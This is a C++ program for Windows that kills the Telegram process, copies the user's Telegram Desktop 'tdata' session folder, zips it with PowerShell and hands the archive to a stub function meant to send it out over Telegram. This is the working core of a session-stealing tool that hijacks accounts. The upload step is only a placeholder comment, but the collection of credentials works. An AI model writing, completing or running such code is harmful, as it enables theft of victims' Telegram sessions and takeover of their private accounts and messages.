
#include <iostream>
#include <string>
#include <filesystem>
#include <cstdlib>
#include <vector>
#include <Windows.h>
#include <shlobj.h> // For SHGetFolderPath
#include <stdexcept>

void zipDirectory(const std::string& source, const std::string& zipFile) {
    std::string command = "powershell Compress-Archive -Path \"" + source + "\" -DestinationPath \"" + zipFile + "\"";
    if (system(command.c_str()) != 0) {
        throw std::runtime_error("Failed to create zip file.");
    }
}

void sendFileToTelegram(const std::string& filepath) {
    // Implement your Telegram API file sending logic.
    // For now, we will just simulate the operation.
    std::cout << "This function should send " << filepath << " to Telegram" << std::endl;
}

void zipTData() {
    char username[256];
    DWORD username_len = sizeof(username);
    if (!GetUserName(username, &username_len)) {
        throw std::runtime_error("Failed to get username.");
    }

    std::string userFolder = std::string("C:\\Users\\") + username + "\\AppData\\Roaming\\Telegram Desktop\\tdata";
    std::string zipFile = "C:\\path\\to\\save\\tdata.zip"; // Specify your output format here
    std::string tempDir = "C:\\path\\to\\temp_tdata";

    // Create the temporary directory
    std::filesystem::create_directory(tempDir);

    try {
        if (std::filesystem::exists(userFolder)) {
            for (const auto& entry : std::filesystem::directory_iterator(userFolder)) {
                const auto& path = entry.path();
                if (path.filename() != "emoji" && path.filename() != "dumps") {
                    if (std::filesystem::is_directory(path)) {
                        std::filesystem::copy(path, tempDir, std::filesystem::copy_options::recursive);
                    } else {
                        std::filesystem::copy(path, tempDir);
                    }
                }
            }
            zipDirectory(tempDir, zipFile);
        } else {
            throw std::runtime_error("TData directory does not exist.");
        }
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
    }

    std::filesystem::remove_all(tempDir); // Cleanup temp directory
    
    // Send the file via Telegram
    sendFileToTelegram(zipFile);
}

int main() {
    // Kill Telegram process
    if (system("taskkill /f /im Telegram.exe") != 0) {
        std::cerr << "Failed to kill Telegram process." << std::endl;
    }

    try {
        zipTData();
    } catch (const std::exception& e) {
        std::cerr << "Error in zipping TData: " << e.what() << std::endl;
    }

    return 0;
}
